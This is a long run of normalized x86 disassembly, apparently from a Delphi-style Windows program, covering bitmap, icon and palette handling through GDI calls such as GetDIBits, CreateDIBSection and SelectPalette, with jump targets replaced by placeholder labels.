pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e2a3
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4026dc
retn
call sub_41d500
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_41df4c
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_41df58
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_41e2f0
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_41d494
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c40
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41d738
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_41e3d4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_41e2f0
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_41e440
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_41e2f0
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e4e4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_41e514
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402c40
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402c40
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_41e508
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41e3d4
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_41e3d4
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_4079a8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_4079a8
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_4079a8
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_4079a8
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_41e440
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_41e440
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e6e2
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4026dc
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4026dc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4026dc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026dc
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41e6e2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e709
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_41e710
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_41e760
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_41e7b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_41e760
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41e801
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40317c
mov edi eax
mov eax esi
call sub_40317c
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407ad4
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e925
mov al 0x1
sub_41e954
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415934
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e9a3
mov eax [ ebp - 0x4 ]
call sub_403234
retn
sub_41e9a8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41e9dc
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415934
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ea2e
mov eax [ ebp - 0x4 ]
call sub_403234
retn
sub_41eaf0
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_413bac
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eb95
mov eax [ rw-data ]
call sub_413c10
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_41ec80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41d0b4
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413840
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41d058
test al al
je r-xdata
sub_41eb9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413bac
mov esi eax
xor ecx ecx
push ebp
push r-xdata
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413c10
retn
mov edx ebx
mov eax esi
call sub_413840
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_41ec80
sub_41ec18
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41cb54
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_41ec54
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_41ec80
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41cc18
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_41ec80
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41ce58
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41d23c
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_413bc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d0b4
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_41ed20
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41ce58
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42003c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_41eb9c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42013c
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d23c
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_413b24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d0b4
retn
sub_41ee10
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403234
sub_41ee30
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_41eb9c
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40cbf8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_41ee8c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_41b4a8
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_41eb9c
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_41eb9c
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_41eed8
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_41dd3c
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41ef94
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_41efe0
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41eb9c
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_41d5a8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41d5a8
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026bc
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_41d494
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_41d5a8
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_41d5a8
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_41d5a8
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_41d5a8
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41f5df
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_41d5a8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_41ef94
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028b8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_41dd3c
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41ca38
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_41240c
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41bd78
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41c9fc
call sub_41bd78
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
